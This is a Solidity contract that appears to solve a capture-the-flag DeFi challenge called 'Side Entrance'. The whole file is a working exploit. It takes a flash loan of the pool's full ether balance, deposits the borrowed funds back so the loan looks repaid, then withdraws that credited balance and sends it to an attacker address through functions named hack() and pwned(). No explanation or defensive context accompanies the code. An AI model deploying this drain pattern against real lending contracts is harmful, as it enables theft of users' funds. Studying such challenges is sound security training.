pragma solidity ^0.6.0;

import "@openzeppelin/contracts/utils/Address.sol";
interface ISideEntranceLenderPool {
    function flashLoan(uint256 amount) external payable;
    function deposit() external payable;
    function withdraw() external;
}

contract FlashLoanEtherReceiver {
    using Address for address payable;

    address payable attacker;
    address payable pool;

    constructor(address payable _pool, address payable _attacker) public {
        pool = _pool;
        attacker = _attacker;
    }

    function hack() external {
        uint256 amount = address(pool).balance;
        ISideEntranceLenderPool(pool).flashLoan(amount);
    }

    function execute() external payable {
        ISideEntranceLenderPool(pool).deposit{value: msg.value}();
    }

    function pwned() external {
        ISideEntranceLenderPool(pool).withdraw();
        attacker.sendValue(address(this).balance);
    }
    
    receive () external payable {}
}
 